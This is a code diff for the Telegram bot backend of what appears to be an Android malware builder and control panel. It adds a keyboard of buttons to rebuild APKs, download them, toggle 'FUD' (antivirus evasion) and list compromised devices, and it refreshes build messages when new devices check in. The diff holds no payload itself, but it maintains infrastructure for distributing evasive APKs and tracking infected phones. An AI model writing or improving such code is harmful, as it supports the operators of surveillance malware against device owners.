@@ -373,7 +373,7 @@ def _refresh_build_message(bot_db, build_id: int):
         b = bot_db.execute(
             "SELECT chat_id, message_id, build_number, template, status, "
             "       package_name, apk_size, duration_secs, started_at, "
-            "       server_ip, server_port, server_key "
+            "       server_ip, server_port, server_key, client_id "
             "FROM builds WHERE id=?", (build_id,)
         ).fetchone()
         if not b or not b["chat_id"] or not b["message_id"]:
@@ -416,13 +416,32 @@ def _refresh_build_message(bot_db, build_id: int):
             f"📱 Devices : {total} total  |  {active} active"
         )
 
+        # Rebuild inline keyboard matching kb_build_detail in vaultguard_bot.py
+        fud_label = "🛡 FUD: Inherit (toggle)"
+        keyboard = {
+            "inline_keyboard": [
+                [
+                    {"text": "📱 Devices", "callback_data": f"devices_{build_id}_1"},
+                    {"text": "🔁 Rebuild",  "callback_data": f"rebuild_{build_id}"}
+                ],
+                [{"text": fud_label, "callback_data": f"toggle_build_fud_{build_id}"}],
+                [{"text": "📥 Get APK",    "callback_data": f"get_apk_{build_id}"}],
+                [{"text": "🗑 Delete Build","callback_data": f"delete_build_confirm_{build_id}_{b['client_id']}"}],
+                [
+                    {"text": "🔙 Back", "callback_data": f"builds_history_{b['client_id']}"},
+                    {"text": "🏠 Home", "callback_data": "nav_home"}
+                ]
+            ]
+        }
+
         import urllib.request as _ureq
         url  = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
         data = json.dumps({
-            "chat_id":    b["chat_id"],
-            "message_id": int(b["message_id"]),
-            "text":       text,
-            "parse_mode": "HTML"
+            "chat_id":      b["chat_id"],
+            "message_id":   int(b["message_id"]),
+            "text":         text,
+            "parse_mode":   "HTML",
+            "reply_markup": keyboard
         }).encode()
         req = _ureq.Request(url, data=data,
               headers={"Content-Type": "application/json"})
@@ -491,8 +510,8 @@ def _sync_device_to_bot_db(device_id: str, ip: str, token: str, is_new: bool,
         bot_db.commit()
         log.info(f"bot.db sync {'new' if is_new else 'update'}: device={device_id[:16]}... client_id={client_id}")
 
-        # Refresh the Telegram build message so Devices count updates live
-        if build_id:
+        # Refresh Telegram build message with correct device count + live keyboard
+        if is_new and build_id:
             _refresh_build_message(bot_db, build_id)
 
         bot_db.close()
